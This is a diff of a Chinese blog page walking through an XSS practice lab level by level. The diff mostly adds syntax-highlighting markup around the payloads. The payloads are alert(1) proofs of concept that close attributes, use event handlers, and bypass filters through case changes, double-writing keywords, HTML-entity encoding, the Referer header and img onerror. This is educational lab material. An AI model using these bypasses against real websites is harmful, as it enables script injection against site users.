@@ -30,6 +30,8 @@
 
     <title>xss实验 | Hkini</title>
     <link rel="icon" type="image/png" href="/medias/logo.png">
+    <link rel="stylesheet" type="text/css" href="/libs/prism/prism.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.bootcdn.net/ajax/libs/prism/1.9.0/plugins/line-numbers/prism-line-numbers.css">
     
 
 
@@ -922,28 +924,24 @@
 <p><strong>方法一</strong></p>
 <ul>
 <li><p>可以构造使value闭合，从而使浏览器执行测试代码</p>
-<pre><code class="javascript">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;//&gt;
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">"<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token comment">//&gt;</span>
 " 闭合value
-&gt; 闭合input
-// 注释后面部分
-</code></pre>
-</li>
+<span class="token operator">&gt;</span> 闭合input
+<span class="token comment">// 注释后面部分</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
 </ul>
 <p><strong>方法二</strong></p>
 <ul>
 <li><p>闭合value，测试鼠标经过输入框</p>
-<pre><code class="js">" onmouseover=alert(1)//
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">" onmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span>
 " 闭合value
-// 
-</code></pre>
-</li>
+<span class="token comment">// </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
 </ul>
 <p><strong>方法三</strong></p>
 <ul>
 <li>闭合value，测试鼠标点击输入框</li>
 </ul>
-<pre><code class="js"> " onclick=alert(1)//
-</code></pre>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">" onclick<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h2 id="level3（htmlspecialchars-str-过滤）"><a href="#level3（htmlspecialchars-str-过滤）" class="headerlink" title="level3（htmlspecialchars($str)过滤）"></a>level3（htmlspecialchars($str)过滤）</h2><h3 id="尝试-2"><a href="#尝试-2" class="headerlink" title="尝试"></a>尝试</h3><ul>
 <li>后台对<h2>和input的value都进行了，htmlspecialchars($str)过滤。</h2></li>
 </ul>
@@ -951,11 +949,9 @@
 <h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ul>
 <li><p>考虑input自身的一些特殊属性，构造没有&lt;&gt;的攻击语句</p>
 <p>比如</p>
-<pre><code class="js">onfocus=javascript:alert('1')
-" onmouseover=alert(1)//
-" onclick=alert(1)//
-</code></pre>
-</li>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onfocus<span class="token operator">=</span>javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+" onmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span>
+" onclick<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
 </ul>
 <h2 id="level4（htmlspecialchars-str-过滤-lt-gt-过滤）"><a href="#level4（htmlspecialchars-str-过滤-lt-gt-过滤）" class="headerlink" title="level4（htmlspecialchars($str)过滤+<>过滤）"></a>level4（htmlspecialchars($str)过滤+&lt;&gt;过滤）</h2><h3 id="尝试-3"><a href="#尝试-3" class="headerlink" title="尝试"></a>尝试</h3><ul>
 <li>使用测试语句，根据反应查看网页源代码</li>
@@ -979,8 +975,8 @@
 <h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><ul>
 <li>使用伪协议javascript: ，将javascript:后面的代码当JavaScript来执行，并将结果值返回给当前页面</li>
 </ul>
-<pre><code>"&gt; &lt;a href=javascript:alert(1)/a&gt;//
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">"&gt; &lt;a href=javascript:alert(1)/a&gt;//<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <ul>
 <li>结果</li>
 </ul>
@@ -997,8 +993,8 @@
 <h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><ul>
 <li>尝试大小写绕过</li>
 </ul>
-<pre><code class="js">"&gt;&lt;Script&gt;alert(1)&lt;/script&gt;
-</code></pre>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">"<span class="token operator">&gt;</span><span class="token operator">&lt;</span>Script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233650.png"></p>
 <ul>
 <li><p>后台代码</p>
@@ -1017,10 +1013,10 @@
 <p>注意value的闭合</p>
 </li>
 </ul>
-<pre><code class="js">&quot;&gt;&lt;scscriptript&gt;alert(1)&lt;/scrscriptipt&gt;//
-&quot; oonnmouseover=alert(1)//
-&quot;&gt; &lt;a hhrefref=javascscriptript:alert(1)/a&gt;//
-</code></pre>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">"<span class="token operator">></span><span class="token operator">&lt;</span>scscriptript<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>scrscriptipt<span class="token operator">></span><span class="token comment">//</span>
+" oonnmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span>
+"<span class="token operator">></span> <span class="token operator">&lt;</span>a hhrefref<span class="token operator">=</span>javascscriptript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token comment">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <ul>
 <li><p>后台代码</p>
 <p>后台使用了转小写的函数，把关键字script ,on,src,data,href进行了过滤。但缺点就是只过滤一次，可以进行双写，使过滤后的代码又闭合成代码</p>
@@ -1056,8 +1052,8 @@
 <h3 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h3><ul>
 <li>将html转化为字符实体，并在后面添加注释“http://”来使得网站合法</li>
 </ul>
-<pre><code class="text">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;//http://
-</code></pre>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;//http://<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <ul>
 <li><p>后端代码</p>
 <p>关键字过滤的比较齐全，</p>
@@ -1084,8 +1080,8 @@
 <h3 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h3><ul>
 <li>去除第三个输入框的hidden，并且利用input的属性进行测试，注意代码的闭合</li>
 </ul>
-<pre><code class="js">&quot;&gt; onmouseover=alert(1)//
-</code></pre>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">"<span class="token operator">></span> onmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <ul>
 <li>后台代码</li>
 </ul>
@@ -1106,10 +1102,8 @@
 </blockquote>
 <ul>
 <li><p>考虑抓包修改referer的值</p>
-<pre><code class="css">&quot;&gt;onmouseover=alert(1)//
-这里构造的是input的属性，这里的referer值是放入到t_ref的value当中的，所以需要注意闭合
-</code></pre>
-</li>
+<pre class="line-numbers language-css" data-language="css"><code class="language-css">">onmouseover=<span class="token function">alert</span><span class="token punctuation">(</span>1<span class="token punctuation">)</span>//
+这里构造的是input的属性，这里的referer值是放入到t_ref的value当中的，所以需要注意闭合<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
 </ul>
 <img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233816.png" style="zoom:50%;" />
 
@@ -1208,8 +1202,8 @@
 </ul>
 <p>这里参考网上资料选择第一关的文件上传，由于第一关需要执行xss代码需要把需要把代码写在name上，直接构造语句就行了。注意需要加引号</p>
 <p>因为过滤了<>，所以使用的是<img>配合onerror来实现的。</p>
-<pre><code class="js">src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;
-</code></pre>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">src<span class="token operator">=</span><span class="token string">'level1.php?name=&lt;img src=1 onerror=alert(1)>'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328234047.png"></p>
 <h2 id="level16（空格-关键字过滤）"><a href="#level16（空格-关键字过滤）" class="headerlink" title="level16（空格+关键字过滤）"></a>level16（空格+关键字过滤）</h2><h3 id="尝试-15"><a href="#尝试-15" class="headerlink" title="尝试"></a>尝试</h3><ul>
 <li>在url中的keyword的值会显示在页面，通过常规语句的尝试发现，对语句有关键字过滤，对空格也有过滤</li>
@@ -1700,12 +1694,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%BC%96%E6%88%90%E5%AD%A6%E4%B9%A0/">
-                        <span class="chip bg-color">编成学习</span>
-                    </a>
-                    
                     <a href="/tags/%E9%A1%B9%E7%9B%AE%E7%BB%8F%E5%8E%86/">
                         <span class="chip bg-color">项目经历</span>
+                    </a>
+                    
+                    <a href="/tags/%E7%BC%96%E6%88%90%E5%AD%A6%E4%B9%A0/">
+                        <span class="chip bg-color">编成学习</span>
                     </a>
                     
                     <a href="/tags/vue/">
